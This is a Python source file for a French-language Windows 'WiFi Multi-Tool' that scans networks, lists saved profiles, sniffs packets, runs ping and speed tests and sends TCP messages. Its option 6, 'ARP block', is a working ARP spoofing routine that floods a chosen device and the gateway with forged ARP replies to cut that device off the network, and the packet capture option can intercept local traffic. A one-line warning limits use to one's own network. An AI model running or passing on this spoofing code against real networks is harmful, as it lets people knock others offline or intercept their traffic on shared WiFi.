#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║           WiFi Multi-Tool  v3.2  — By AKO                ║
║         Windows Edition  ·  Python 3.10+                 ║
║                                                          ║
║  Dépendances :                                           ║
║    pip install colorama scapy requests                   ║
║    + Npcap : https://npcap.com/#download                 ║
╚══════════════════════════════════════════════════════════╝
"""

import subprocess, sys, os, re, socket, csv, time, threading
from datetime import datetime
from pathlib import Path

# ── Colorama ─────────────────────────────────────────────
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama -q")
    from colorama import init, Fore, Style
    init(autoreset=True)

# ── Scapy ─────────────────────────────────────────────────
try:
    from scapy.all import sniff, ARP, Ether, srp, send
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ── Requests (débit) ─────────────────────────────────────
try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False


# ══════════════════════════════════════════════════════════
#  PALETTE  — Orange / Rouge / Gris sobre
# ══════════════════════════════════════════════════════════
R  = Fore.RED
O  = Fore.YELLOW
W  = Fore.WHITE
D  = Fore.LIGHTBLACK_EX
C  = Fore.CYAN
G  = Fore.LIGHTGREEN_EX
BR = Style.BRIGHT
RS = Style.RESET_ALL

def title(t):  return f"\n{BR}{O}  ▸ {t}{RS}"
def ok(t):     return f"{G}  [✓] {t}{RS}"
def err(t):    return f"{R}  [✗] {t}{RS}"
def warn(t):   return f"{O}  [!] {t}{RS}"
def info(t):   return f"{D}  [·] {t}{RS}"
def sep():     return f"{D}  {'─'*62}{RS}"

LOG_DIR = Path("wifi_logs")
LOG_DIR.mkdir(exist_ok=True)

_last_networks = []


# ══════════════════════════════════════════════════════════
#  EFFET DÉROULEMENT TEXTE
# ══════════════════════════════════════════════════════════
def typewrite(text: str, delay: float = 0.018):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def slow_banner():
    os.system("cls" if os.name == "nt" else "clear")

    lines = [
        f"{BR}{R}  ██╗    ██╗██╗███████╗██╗    ███╗   ███╗██╗   ██╗██╗  ████████╗██╗{RS}",
        f"{BR}{O}  ██║    ██║██║██╔════╝██║    ████╗ ████║██║   ██║██║  ╚══██╔══╝██║{RS}",
        f"{BR}{R}  ██║ █╗ ██║██║█████╗  ██║    ██╔████╔██║██║   ██║██║     ██║   ██║{RS}",
        f"{BR}{O}  ██║███╗██║██║██╔══╝  ██║    ██║╚██╔╝██║██║   ██║██║     ██║   ██║{RS}",
        f"{BR}{R}  ╚███╔███╔╝██║██║     ██║    ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║{RS}",
        f"{BR}{O}   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝{RS}",
    ]
    for line in lines:
        print(line)
        time.sleep(0.07)

    time.sleep(0.1)
    typewrite(f"{D}  {'─'*62}{RS}", delay=0.004)
    typewrite(f"{BR}{O}             WiFi Multi-Tool  v3.2  —  By AKO{RS}", delay=0.025)
    typewrite(f"{D}             Windows Edition  ·  Python 3{RS}", delay=0.018)
    typewrite(f"{D}  {'─'*62}{RS}", delay=0.004)

    boot_msgs = [
        "Chargement des modules réseau…",
        "Détection de l'interface WiFi…",
        "Initialisation de la palette…",
        "Prêt.",
    ]
    print()
    for msg in boot_msgs:
        sys.stdout.write(f"  {D}[boot]{RS} {W}")
        typewrite(msg, delay=0.022)
        time.sleep(0.08)
    time.sleep(0.3)
    print()

BANNER = f"""
{BR}{R}  ██╗    ██╗██╗███████╗██╗    ███╗   ███╗██╗   ██╗██╗  ████████╗██╗{RS}
{BR}{O}  ██║    ██║██║██╔════╝██║    ████╗ ████║██║   ██║██║  ╚══██╔══╝██║{RS}
{BR}{R}  ██║ █╗ ██║██║█████╗  ██║    ██╔████╔██║██║   ██║██║     ██║   ██║{RS}
{BR}{O}  ██║███╗██║██║██╔══╝  ██║    ██║╚██╔╝██║██║   ██║██║     ██║   ██║{RS}
{BR}{R}  ╚███╔███╔╝██║██║     ██║    ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║{RS}
{BR}{O}   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝{RS}
{D}               WiFi Multi-Tool  v3.2  —  By AKO{RS}
"""

MENU = f"""
{sep()}
{BR}{W}  MENU PRINCIPAL  {D}· v3.2 · By AKO{RS}

{BR}{O}  ── RÉSEAU ──────────────────────────────────────────────{RS}
  {W}[1]{RS}  Scanner les réseaux WiFi disponibles
  {W}[2]{RS}  Infos réseau connecté  (IP · Gateway · DNS)
  {W}[3]{RS}  Historique des réseaux connus (profils)
  {W}[4]{RS}  Vérifier la sécurité des réseaux  (WEP/WPA/WPA2)

{BR}{O}  ── APPAREILS ───────────────────────────────────────────{RS}
  {W}[5]{RS}  Voir les appareils connectés  (ARP scan)
  {W}[6]{RS}  Couper l'accès d'un appareil  (ARP block)
  {W}[7]{RS}  Envoyer un message à un appareil  (TCP)

{BR}{O}  ── DIAGNOSTIC ──────────────────────────────────────────{RS}
  {W}[8]{RS}  Ping / test de latence
  {W}[9]{RS}  Test de débit internet
  {W}[10]{RS} Capturer des paquets réseau
  {W}[11]{RS} Mode surveillance  (scan en boucle)

{BR}{O}  ── CONTRÔLE ────────────────────────────────────────────{RS}
  {W}[12]{RS} Allumer le WiFi
  {W}[13]{RS} Éteindre le WiFi

{BR}{O}  ── EXPORT ──────────────────────────────────────────────{RS}
  {W}[14]{RS} Exporter le dernier scan  (CSV / TXT)

  {W}[0]{RS}  {R}Quitter{RS}
{sep()}"""


# ══════════════════════════════════════════════════════════
#  UTILITAIRES
# ══════════════════════════════════════════════════════════
def run(cmd: list) -> tuple:
    r = subprocess.run(cmd, capture_output=True, text=True,
                       encoding="utf-8", errors="ignore")
    return r.returncode, r.stdout + r.stderr

def get_wifi_iface() -> str:
    _, out = run(["netsh", "interface", "show", "interface"])
    for line in out.splitlines():
        if any(k in line for k in ("Wi-Fi", "WiFi", "Wireless")):
            parts = line.split()
            if parts: return parts[-1]
    return "Wi-Fi"

def get_gateway() -> str:
    _, ipcfg = run(["ipconfig"])
    for line in ipcfg.splitlines():
        if re.search(r"Passerelle|Default Gateway", line):
            m = re.search(r"[\d.]+", line.split(":")[-1])
            if m: return m.group()
    return "192.168.1.1"

def pause():
    input(f"\n{D}  Appuyez sur Entrée pour continuer…{RS}")

def clear_print_banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)


# ══════════════════════════════════════════════════════════
#  1. SCANNER LES RÉSEAUX
# ══════════════════════════════════════════════════════════
def scan_networks(silent=False) -> list:
    global _last_networks
    if not silent:
        print(title('SCAN DES RÉSEAUX WIFI'))
        print(sep())
        print(info("Scan en cours…"))

    code, out = run(["netsh", "wlan", "show", "networks", "mode=Bssid"])
    if code != 0:
        if not silent: print(err("Impossible de scanner. WiFi allumé ?"))
        return []

    networks, cur = [], {}
    for line in out.splitlines():
        line = line.strip()
        if re.match(r"^SSID\s+\d+", line):
            if cur: networks.append(cur)
            cur = {"ssid": line.split(":",1)[-1].strip()}
        elif "Authentification" in line or "Authentication" in line:
            cur["auth"] = line.split(":",1)[-1].strip()
        elif "Chiffrement" in line or "Cipher" in line:
            cur["cipher"] = line.split(":",1)[-1].strip()
        elif "Signal" in line:
            cur["signal"] = line.split(":",1)[-1].strip()
        elif re.match(r"^\s*BSSID\s+1", line):
            cur["bssid"] = line.split(":",1)[-1].strip()
        elif "Canal" in line or "Channel" in line:
            cur["channel"] = line.split(":",1)[-1].strip()
    if cur: networks.append(cur)
    _last_networks = networks

    if not silent:
        if not networks:
            print(warn("Aucun réseau détecté.")); pause(); return []
        print(f"\n  {BR}{W}{'#':<4} {'SSID':<26} {'BSSID':<20} {'Signal':<9} {'Canal':<7} Auth / Chiffrement{RS}")
        print(sep())
        for i, n in enumerate(networks, 1):
            ssid   = n.get("ssid",    "?")[:24]
            bssid  = n.get("bssid",   "?")[:18]
            signal = n.get("signal",  "?")
            chan   = n.get("channel", "?")
            auth   = n.get("auth",    "?")
            cipher = n.get("cipher",  "")
            try:
                pct = int(signal.replace("%",""))
                sc  = G if pct >= 70 else (O if pct >= 40 else R)
            except Exception:
                sc = W
            print(f"  {D}{i:<4}{RS}{W}{ssid:<26}{RS}{D}{bssid:<20}{RS}"
                  f"{sc}{signal:<9}{RS}{D}{chan:<7}{RS}{D}{auth}  {cipher}{RS}")
        print(f"\n{ok(str(len(networks)) + ' réseau(x) trouvé(s)')}")
        pause()

    return networks


# ══════════════════════════════════════════════════════════
#  2. INFOS RÉSEAU CONNECTÉ
# ══════════════════════════════════════════════════════════
def network_info():
    print(title('INFOS RÉSEAU CONNECTÉ'))
    print(sep())

    _, ssid_out = run(["netsh", "wlan", "show", "interfaces"])
    ssid = bssid = signal = speed = "?"
    for line in ssid_out.splitlines():
        l = line.strip()
        if l.startswith("SSID") and "BSSID" not in l:
            ssid = l.split(":",1)[-1].strip()
        elif "BSSID" in l:
            bssid = l.split(":",1)[-1].strip()
        elif "Signal" in l:
            signal = l.split(":",1)[-1].strip()
        elif any(k in l for k in ("Débit","Receive rate","Vitesse","Rate")):
            speed = l.split(":",1)[-1].strip()

    _, ipcfg = run(["ipconfig", "/all"])
    ip = mask = gw = "?"
    dns_list = []
    in_wifi = False
    for line in ipcfg.splitlines():
        if any(k in line for k in ("Wi-Fi","WiFi","Wireless")): in_wifi = True
        if in_wifi:
            l = line.strip()
            if re.search(r"Adresse IPv4|IPv4 Address", l):
                m = re.search(r"[\d.]+", l.split(":")[-1])
                if m: ip = m.group()
            elif re.search(r"Masque|Subnet Mask", l):
                mask = l.split(":")[-1].strip()
            elif re.search(r"Passerelle|Default Gateway", l):
                m = re.search(r"[\d.]+", l.split(":")[-1])
                if m: gw = m.group()
            elif re.search(r"Serveurs DNS|DNS Servers", l):
                m = re.search(r"[\d.]+", l.split(":")[-1])
                if m: dns_list.append(m.group())
            elif dns_list and re.match(r"^\s+[\d.]+", line):
                dns_list.append(line.strip())
            elif line.strip() == "" and in_wifi and ip != "?":
                break

    hostname = socket.gethostname()
    rows = [
        ("SSID connecté",  ssid),
        ("BSSID",          bssid),
        ("Signal",         signal),
        ("Débit",          speed),
        ("──────────────", ""),
        ("Adresse IP",     ip),
        ("Masque",         mask),
        ("Passerelle",     gw),
        ("DNS",            " · ".join(dns_list) if dns_list else "?"),
        ("──────────────", ""),
        ("Hostname",       hostname),
    ]
    print()
    for k, v in rows:
        if k.startswith("──"):
            print(f"  {D}{k}{RS}")
        else:
            print(f"  {O}{k:<18}{RS}{W}{v}{RS}")
    pause()


# ══════════════════════════════════════════════════════════
#  3. HISTORIQUE RÉSEAUX CONNUS
# ══════════════════════════════════════════════════════════
def known_networks():
    print(title('HISTORIQUE DES RÉSEAUX CONNUS'))
    print(sep())
    _, out = run(["netsh", "wlan", "show", "profiles"])
    profiles = re.findall(r"(?:Profil\s+\w+|All User Profile)\s*:\s*(.+)", out)

    if not profiles:
        print(warn("Aucun profil trouvé.")); pause(); return

    print(f"\n  {BR}{W}{'#':<4} {'SSID':<35} Authentification{RS}")
    print(sep())
    for i, name in enumerate(profiles, 1):
        name = name.strip()
        _, detail = run(["netsh", "wlan", "show", "profile", f"name={name}"])
        auth = "?"
        for line in detail.splitlines():
            if "Authentification" in line or "Authentication" in line:
                auth = line.split(":",1)[-1].strip(); break
        print(f"  {D}{i:<4}{RS}{W}{name:<35}{RS}{D}{auth}{RS}")

    print(f"\n{ok(str(len(profiles)) + ' profil(s) enregistré(s)')}")
    pause()


# ══════════════════════════════════════════════════════════
#  4. VÉRIFICATION SÉCURITÉ RÉSEAUX
# ══════════════════════════════════════════════════════════
SECURITY_LEVELS = {
    "WEP":      (R,  "FAIBLE    — Chiffrement cassable en minutes"),
    "WPA":      (O,  "MOYEN     — Vulnérable aux attaques dictionnaire"),
    "WPA2":     (G,  "BON       — Recommandé, suffisant pour usage courant"),
    "WPA3":     (G,  "EXCELLENT — Dernière génération, très sécurisé"),
    "Ouvert":   (R,  "AUCUN     — Réseau non chiffré, dangereux"),
    "Open":     (R,  "AUCUN     — Réseau non chiffré, dangereux"),
}

def check_security():
    print(title('VÉRIFICATION SÉCURITÉ DES RÉSEAUX'))
    print(sep())
    print(info("Scan en cours…"))
    networks = scan_networks(silent=True)
    if not networks:
        print(err("Aucun réseau trouvé.")); pause(); return

    print(f"\n  {BR}{W}{'SSID':<28} {'Auth':<10} Évaluation{RS}")
    print(sep())
    for n in networks:
        ssid = n.get("ssid", "?")[:26]
        auth = n.get("auth", "?")
        color, label = W, "INCONNU"
        for key, (col, lbl) in SECURITY_LEVELS.items():
            if key.lower() in auth.lower():
                color, label = col, lbl; break
        print(f"  {W}{ssid:<28}{RS}{D}{auth:<10}{RS}{color}{label}{RS}")

    print(f"\n{ok('Analyse terminée')}")
    pause()


# ══════════════════════════════════════════════════════════
#  5. ARP SCAN — APPAREILS CONNECTÉS
# ══════════════════════════════════════════════════════════
def arp_scan(silent=False) -> list:
    if not silent:
        print(title('APPAREILS CONNECTÉS (ARP SCAN)'))
        print(sep())

    if not SCAPY_OK:
        if not silent:
            print(err("Scapy non installé : pip install scapy"))
            print(info("Npcap requis : https://npcap.com/#download"))
            pause()
        return []

    _, ipcfg = run(["ipconfig"])
    subnet = "192.168.1.0/24"
    in_wifi = False
    for line in ipcfg.splitlines():
        if any(k in line for k in ("Wi-Fi","Wireless")): in_wifi = True
        if in_wifi:
            m = re.search(r"(192\.168\.\d+|10\.\d+\.\d+|172\.\d+\.\d+)\.\d+", line)
            if m: subnet = m.group(1) + ".0/24"; break

    if not silent:
        print(info(f"Scan du subnet {subnet}…"))
        print(warn("Cela peut prendre 5–15 secondes…\n"))

    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                     timeout=3, verbose=0)
        devices = []
        for _, rcv in ans:
            ip_a = rcv.psrc; mac = rcv.hwsrc
            try:    host = socket.gethostbyaddr(ip_a)[0]
            except: host = "inconnu"
            devices.append({"ip": ip_a, "mac": mac, "host": host})

        if not silent:
            if not devices:
                print(warn("Aucun appareil détecté. Lancez en Admin.")); pause(); return []
            print(f"  {BR}{W}{'#':<4} {'IP':<18} {'MAC':<20} Nom d'hôte{RS}")
            print(sep())
            for i, d in enumerate(sorted(devices, key=lambda x: x["ip"]), 1):
                print(f"  {D}{i:<4}{RS}{O}{d['ip']:<18}{RS}{D}{d['mac']:<20}{RS}{W}{d['host']}{RS}")
            print(f"\n{ok(str(len(devices)) + ' appareil(s) détecté(s)')}")
            pause()

        return devices

    except PermissionError:
        if not silent: print(err("Lancez en Administrateur."))
    except Exception as e:
        if not silent: print(err(f"Erreur ARP : {e}"))
    return []


# ══════════════════════════════════════════════════════════
#  6. COUPER L'ACCÈS D'UN APPAREIL (ARP BLOCK)
# ══════════════════════════════════════════════════════════
def arp_block():
    from scapy.all import sendp, get_if_hwaddr, conf as scapy_conf

    print(title("COUPER L'ACCES D'UN APPAREIL"))
    print(sep())
    print(warn("Utilise uniquement sur TON propre reseau et tes propres appareils."))
    print(info("Principe : faux paquets ARP pour isoler l'appareil du routeur.\n"))

    if not SCAPY_OK:
        print(err("Scapy requis : pip install scapy + Npcap")); pause(); return

    print(info("Scan des appareils en cours…"))
    devices = arp_scan(silent=True)
    if not devices:
        print(err("Aucun appareil trouve. Lancez en Admin.")); pause(); return

    print(f"\n  {BR}{W}{'#':<4} {'IP':<18} {'MAC':<20} Nom d'hote{RS}")
    print(sep())
    for i, d in enumerate(devices, 1):
        print(f"  {W}{i:<4}{RS}{O}{d['ip']:<18}{RS}{D}{d['mac']:<20}{RS}{W}{d['host']}{RS}")

    print()
    choice = input(f"  {W}Numero de l'appareil a bloquer (0 = annuler) : {RS}").strip()
    if not choice.isdigit() or int(choice) == 0: return
    idx = int(choice) - 1
    if idx < 0 or idx >= len(devices):
        print(err("Numero invalide.")); pause(); return

    target  = devices[idx]
    t_ip    = target["ip"]
    t_mac   = target["mac"]
    t_host  = target["host"]
    gw_ip   = get_gateway()

    # Résolution MAC passerelle via ARP
    print(info(f"Resolution MAC de la passerelle {gw_ip}…"))
    gw_mac = "ff:ff:ff:ff:ff:ff"
    try:
        gw_ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
            timeout=3, verbose=0, retry=2
        )
        if gw_ans:
            gw_mac = gw_ans[0][1].hwsrc
            print(ok(f"Passerelle : {gw_ip}  →  {gw_mac}"))
        else:
            print(warn("MAC passerelle non resolue, utilisation broadcast."))
    except Exception as e:
        print(warn(f"ARP passerelle echoue ({e}), utilisation broadcast."))

    # MAC de notre propre interface
    try:
        my_mac = get_if_hwaddr(scapy_conf.iface)
    except Exception:
        my_mac = "ff:ff:ff:ff:ff:ff"

    dur_raw  = input(f"  {W}Duree du blocage en secondes [{D}30{W}] : {RS}").strip()
    duration = int(dur_raw) if dur_raw.isdigit() else 30

    print(f"\n{warn(f'Blocage de {t_ip} ({t_host}) pendant {duration}s…')}")
    print(info("Ctrl+C pour arreter.\n"))

    stop_event = threading.Event()

    def block_loop():
        # Paquet vers la CIBLE : lui dit que la gateway c'est nous
        pkt_target = (
            Ether(src=my_mac, dst=t_mac) /
            ARP(op=2, hwsrc=my_mac, psrc=gw_ip, hwdst=t_mac, pdst=t_ip)
        )
        # Paquet vers la GATEWAY : lui dit que la cible c'est nous
        pkt_gw = (
            Ether(src=my_mac, dst=gw_mac) /
            ARP(op=2, hwsrc=my_mac, psrc=t_ip, hwdst=gw_mac, pdst=gw_ip)
        )
        end = time.time() + duration
        sent = 0
        while not stop_event.is_set() and time.time() < end:
            try:
                for _ in range(5):
                    sendp(pkt_target, verbose=0)
                    sendp(pkt_gw,     verbose=0)
                    sent += 1
                sys.stdout.write(f"\r  {D}Paquets envoyes : {sent * 2}{RS}   ")
                sys.stdout.flush()
                time.sleep(0.2)
            except Exception:
                break
        print()

    t = threading.Thread(target=block_loop)
    t.start()
    try:
        t.join()
    except KeyboardInterrupt:
        stop_event.set()
        t.join()

    print(ok(f"Blocage termine pour {t_ip}"))
    pause()


# ══════════════════════════════════════════════════════════
#  7. ENVOYER UN MESSAGE VIA WIFI (TCP)
# ══════════════════════════════════════════════════════════
MSG_PORT = 55500

def send_message():
    print(title('ENVOYER UN MESSAGE À UN APPAREIL'))
    print(sep())
    print(info("Les deux appareils doivent être sur le même réseau WiFi."))
    print(info(f"Le destinataire doit lancer ce script → option [7] → mode écoute.\n"))

    mode = input(f"  {W}[e] Envoyer  |  [r] Recevoir (écouter) : {RS}").strip().lower()

    if mode == "r":
        # MODE ÉCOUTE
        print(f"\n{ok(f'En attente de messages sur le port {MSG_PORT}…')}")
        print(info("Ctrl+C pour arrêter.\n"))
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", MSG_PORT))
            srv.listen(5)
            while True:
                conn, addr = srv.accept()
                data = conn.recv(4096).decode("utf-8", errors="ignore")
                ts   = datetime.now().strftime("%H:%M:%S")
                print(f"  {D}[{ts}]{RS} {O}De {addr[0]}{RS} : {W}{data}{RS}")
                conn.close()
        except KeyboardInterrupt:
            print(f"\n{info('Écoute arrêtée.')}")
        except Exception as e:
            print(err(f"Erreur : {e}"))
        pause()

    else:
        # MODE ENVOI
        ip_dest = input(f"  {W}IP de destination : {RS}").strip()
        msg     = input(f"  {W}Votre message : {RS}").strip()
        if not ip_dest or not msg:
            print(err("IP ou message vide.")); pause(); return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip_dest, MSG_PORT))
            s.sendall(msg.encode("utf-8"))
            s.close()
            print(ok(f"Message envoyé à {ip_dest}"))
        except ConnectionRefusedError:
            print(err("Connexion refusée. L'appareil écoute-t-il ?"))
        except socket.timeout:
            print(err("Timeout — appareil inaccessible ou port fermé."))
        except Exception as e:
            print(err(f"Erreur : {e}"))
        pause()


# ══════════════════════════════════════════════════════════
#  8. PING / LATENCE
# ══════════════════════════════════════════════════════════
def ping_test():
    print(title('PING / TEST DE LATENCE'))
    print(sep())
    raw = input(f"\n  {W}Hôtes à pinger (virgule) [{D}8.8.8.8, google.com{W}] : {RS}").strip()
    targets = [t.strip() for t in raw.split(",")] if raw else ["8.8.8.8","google.com","1.1.1.1"]
    cnt_raw = input(f"  {W}Pings par hôte [{D}4{W}] : {RS}").strip()
    count   = int(cnt_raw) if cnt_raw.isdigit() else 4
    print()
    for host in targets:
        print(f"  {O}▶ {host}{RS}")
        _, out = run(["ping", "-n", str(count), host])
        m = re.search(r"Minimum\s*=\s*(\d+)ms.*Moyen\s*=\s*(\d+)ms.*Maximum\s*=\s*(\d+)ms", out)
        if not m:
            m = re.search(r"Minimum = (\d+)ms, Maximum = (\d+)ms, Average = (\d+)ms", out)
        loss_m = re.search(r"(\d+)%\s*(?:perte|loss)", out, re.IGNORECASE)
        loss   = int(loss_m.group(1)) if loss_m else 100
        lc     = G if loss == 0 else (O if loss < 50 else R)
        if m:
            mn, avg, mx = m.group(1), m.group(2), m.group(3)
            print(f"    {D}Min:{RS}{G}{mn}ms{RS}  {D}Moy:{RS}{G}{avg}ms{RS}  "
                  f"{D}Max:{RS}{G}{mx}ms{RS}  {D}Perte:{RS}{lc}{loss}%{RS}")
        else:
            print(f"    {R}Hôte inaccessible / timeout{RS}")
        print()
    pause()


# ══════════════════════════════════════════════════════════
#  9. TEST DE DÉBIT INTERNET
# ══════════════════════════════════════════════════════════
def speed_test():
    print(title('TEST DE DÉBIT INTERNET'))
    print(sep())

    # Test download via fichier de référence
    TEST_URLS = [
        ("Cloudflare (10MB)", "https://speed.cloudflare.com/__down?bytes=10000000"),
        ("Google (1MB)",      "https://www.google.com/images/phd/px.gif"),
    ]

    if not REQUESTS_OK:
        print(err("Module 'requests' requis : pip install requests")); pause(); return

    print(info("Test de téléchargement en cours…\n"))
    for label, url in TEST_URLS:
        try:
            start = time.time()
            r = requests.get(url, timeout=10, stream=True)
            total = 0
            for chunk in r.iter_content(chunk_size=8192):
                total += len(chunk)
            elapsed = time.time() - start
            if elapsed > 0:
                mbps = (total * 8) / (elapsed * 1_000_000)
                speed_color = G if mbps > 20 else (O if mbps > 5 else R)
                print(f"  {D}{label:<28}{RS} {speed_color}{mbps:.2f} Mbps{RS}"
                      f"  {D}({total//1024} KB en {elapsed:.1f}s){RS}")
        except Exception as e:
            print(f"  {D}{label:<28}{RS} {R}Erreur : {e}{RS}")

    print(f"\n{ok('Test terminé')}")
    pause()


# ══════════════════════════════════════════════════════════
#  10. CAPTURE DE PAQUETS
# ══════════════════════════════════════════════════════════
def capture_packets():
    print(title('CAPTURE DE PAQUETS'))
    print(sep())
    if not SCAPY_OK:
        print(err("Scapy requis : pip install scapy + Npcap")); pause(); return
    n_raw = input(f"\n  {W}Nombre de paquets [{D}30{W}] : {RS}").strip()
    count = int(n_raw) if n_raw.isdigit() else 30
    print(f"\n{info(f'Capture de {count} paquets… (Ctrl+C pour stopper)')}\n")
    captured = []
    def handle(pkt):
        ts = datetime.now().strftime("%H:%M:%S")
        s  = pkt.summary()[:72]
        captured.append({"time": ts, "summary": s})
        pc = C if "TCP" in s else (O if "UDP" in s else D)
        print(f"  {D}[{ts}]{RS} {pc}{s}{RS}")
    try:
        sniff(prn=handle, count=count, store=False)
    except PermissionError:
        print(err("Lancez en Administrateur."))
    except Exception as e:
        print(err(f"Erreur : {e}"))
    print(f"\n{ok(str(len(captured)) + ' paquet(s) capturé(s)')}")
    if captured:
        sv = input(f"  {W}Sauvegarder ? [o/N] : {RS}").strip().lower()
        if sv == "o":
            fname = LOG_DIR / f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(fname, "w", encoding="utf-8") as f:
                for p in captured:
                    f.write(f"[{p['time']}] {p['summary']}\n")
            print(ok(f"Sauvegardé → {fname}"))
    pause()


# ══════════════════════════════════════════════════════════
#  11. MODE SURVEILLANCE (scan en boucle)
# ══════════════════════════════════════════════════════════
def surveillance_mode():
    print(title('MODE SURVEILLANCE'))
    print(sep())
    print(info("Scanne les réseaux en boucle et alerte si un nouveau apparaît."))
    interval_raw = input(f"\n  {W}Intervalle en secondes [{D}15{W}] : {RS}").strip()
    interval = int(interval_raw) if interval_raw.isdigit() else 15

    print(f"\n{ok(f'Surveillance lancée (toutes les {interval}s) — Ctrl+C pour arrêter')}\n")

    known_ssids = set()
    cycle = 0

    try:
        while True:
            cycle += 1
            ts = datetime.now().strftime("%H:%M:%S")
            nets = scan_networks(silent=True)
            current_ssids = {n.get("ssid","") for n in nets}

            new_ones = current_ssids - known_ssids
            gone     = known_ssids - current_ssids if known_ssids else set()

            sys.stdout.write(f"\r  {D}[{ts}] Cycle {cycle} — {len(nets)} réseau(x) visibles{RS}   ")
            sys.stdout.flush()

            if new_ones:
                print(f"\n{warn('NOUVEAU(X) RÉSEAU(X) DÉTECTÉ(S) :')}")
                for s in new_ones:
                    print(f"  {G}  + {s}{RS}")
            if gone:
                print(f"\n{info('Réseau(x) disparu(s) :')}")
                for s in gone:
                    print(f"  {D}  - {s}{RS}")

            known_ssids = current_ssids
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n\n{info('Surveillance arrêtée.')}")
    pause()


# ══════════════════════════════════════════════════════════
#  12 & 13. ALLUMER / ÉTEINDRE LE WIFI
# ══════════════════════════════════════════════════════════
def wifi_toggle(enable: bool):
    action = "enabled" if enable else "disabled"
    label  = "ACTIVATION" if enable else "DÉSACTIVATION"
    print(title(label + ' DU WIFI'))
    print(sep())
    iface = get_wifi_iface()
    code, out = run(["netsh", "interface", "set", "interface", iface, action])
    if code == 0:
        print(ok(f"WiFi {'activé' if enable else 'désactivé'}  ({iface})"))
    else:
        print(err("Échec. Lancez en Administrateur."))
        print(info(out.strip()[:120]))
    pause()


# ══════════════════════════════════════════════════════════
#  14. EXPORT CSV / TXT
# ══════════════════════════════════════════════════════════
def export_results():
    global _last_networks
    print(title('EXPORT DES RÉSULTATS'))
    print(sep())
    if not _last_networks:
        print(warn("Aucun scan effectué. Lancez d'abord l'option [1].")); pause(); return
    fmt = input(f"\n  {W}Format [{D}csv{W}/{D}txt{W}] (défaut csv) : {RS}").strip().lower()
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    if fmt == "txt":
        fname = LOG_DIR / f"scan_{ts}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            f.write(f"WiFi Scan — By AKO — {datetime.now()}\n{'─'*50}\n\n")
            for n in _last_networks:
                for k, v in n.items():
                    f.write(f"{k:<12}: {v}\n")
                f.write("\n")
    else:
        fname = LOG_DIR / f"scan_{ts}.csv"
        keys  = ["ssid","bssid","signal","channel","auth","cipher"]
        with open(fname, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=keys, extrasaction="ignore")
            w.writeheader()
            w.writerows(_last_networks)
    print(ok(f"Exporté → {fname.resolve()}"))
    pause()


# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════
ACTIONS = {
    "1":  scan_networks,
    "2":  network_info,
    "3":  known_networks,
    "4":  check_security,
    "5":  arp_scan,
    "6":  arp_block,
    "7":  send_message,
    "8":  ping_test,
    "9":  speed_test,
    "10": capture_packets,
    "11": surveillance_mode,
    "12": lambda: wifi_toggle(True),
    "13": lambda: wifi_toggle(False),
    "14": export_results,
}

def main():
    slow_banner()   # ← effet déroulement au lancement

    try:
        import ctypes
        is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        is_admin = False

    if not is_admin:
        print(warn("Non lancé en Administrateur — options 5/6/10/12/13 limitées."))
    else:
        print(ok("Droits Administrateur détectés."))
    print(info(f"Logs → {LOG_DIR.resolve()}"))

    while True:
        print(MENU)
        choice = input(f"  {BR}{O}→{RS} {W}Votre choix : {RS}").strip()
        clear_print_banner()

        if choice in ACTIONS:
            ACTIONS[choice]()
        elif choice == "0":
            print(f"\n{BR}{O}  WiFi Multi-Tool v3.2 — By AKO{RS}")
            typewrite(f"{D}  À bientôt !{RS}", delay=0.03)
            print()
            sys.exit(0)
        else:
            print(warn("Choix invalide."))


if __name__ == "__main__":
    main()
